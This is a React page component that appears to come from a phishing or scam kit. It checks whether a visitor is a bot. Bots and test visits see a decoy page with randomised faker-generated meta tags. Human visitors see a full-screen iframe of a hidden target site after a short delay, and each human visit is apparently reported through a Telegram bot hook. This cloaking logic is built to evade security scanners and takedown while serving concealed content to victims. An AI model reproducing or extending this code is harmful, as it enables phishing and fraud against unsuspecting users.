import { Helmet } from 'react-helmet';
import MetaIcon from '../assets/icon.ico';
import type { FC } from 'react';
import { useEffect, useRef, useState } from 'react';
import { sendBotTelegram,useBotDetection } from '@/hooks/useBotDetection';
import { faker } from "@faker-js/faker";

interface MetaTag {
  title: string;
  description: string;
  keywords: string;
}

const generateRandomMeta = (): MetaTag => ({
  title: faker.company.catchPhrase(),
  description: faker.lorem.sentence(15),
  keywords: faker.lorem.words(6).replace(/\s+/g, ", ")
});

const Index: FC = () => {
    const [meta, setMeta] = useState<MetaTag | null>(null);
    const { isBot, isLoading, shouldRedirect } = useBotDetection();
    const [redirecting, setRedirecting] = useState(false);
    const logSentRef = useRef(false);
    let[SiteTitleMeta, SetSiteTitleMeta] = useState('Hello Page');
    function showIframe(file,title,favicon) {
    const html = (
      <>
      <Helmet>
          <title>{title}</title>
          {favicon == true ? 
          <link rel="icon" type="image/svg+xml" href={MetaIcon}/>
           :
           null
          }
      </Helmet>
      <iframe src={file} style={{
        position: 'fixed',
        top: '0px',
        bottom: '0px',
        right: '0px',
        width: '100%',
        border: 'none',
        margin: '0',
        padding: '0',
        overflow: 'hidden',
        zIndex: '999999',
        height: '100%',
      }}></iframe>
      </>
    );
    return html;
    }
    useEffect(() => {
      const saved = sessionStorage.getItem("randomMeta");
      console.log(saved);
      if (saved) {
        setMeta(JSON.parse(saved));
      } else {
        const m = generateRandomMeta();
        setMeta(m);
        sessionStorage.setItem("randomMeta", JSON.stringify(m));
      }
    }, []);
    useEffect(() => {
        if (shouldRedirect && !isBot && !isLoading) {
           setRedirecting(true);
        }
    }, [shouldRedirect, isBot, isLoading]);
    useEffect(() => {
        if (!isLoading && !isBot && !logSentRef.current) {
            logSentRef.current = true;
            sendBotTelegram('');
        }
    }, [isLoading, isBot]);
    useEffect(() => {
        if (!isLoading && !isBot && !shouldRedirect) {
            const timer = setTimeout(() => {
               setRedirecting(true);
            }, 3000);

            return () => clearTimeout(timer);
        }
    }, [isBot, isLoading, shouldRedirect]);

    if (isLoading) {
        return (
            <div className="fixed inset-0 flex items-center justify-center bg-white">
                <div className="flex flex-col items-center gap-2">
                </div>
            </div>
        );
    }
    const params = new URLSearchParams(window.location.search);
    if (isBot || Number(params.get("test")) == 1) {
        return(
        <>
      {meta && (
        <Helmet>
          <title>{meta.title}</title>
          <meta name="description" content={meta.description} />
          <meta name="keywords" content={meta.keywords} />
          <meta property="og:title" content={meta.title} />
          <meta property="og:description" content={meta.description} />
          <meta property="og:type" content="website" />
          <meta property="og:image" content={faker.image.urlPicsumPhotos()} />
        </Helmet>
      )}
       <iframe src='/static/home.html' style={{
        position: 'fixed',
        top: '0px',
        bottom: '0px',
        right: '0px',
        width: '100%',
        border: 'none',
        margin: '0',
        padding: '0',
        overflow: 'hidden',
        zIndex: '999999',
        height: '100%',
      }}></iframe>
      </>
    );
    }
    return showIframe(import.meta.env.PUBLIC_SITE_URL,SiteTitleMeta,false);
};

export default Index;
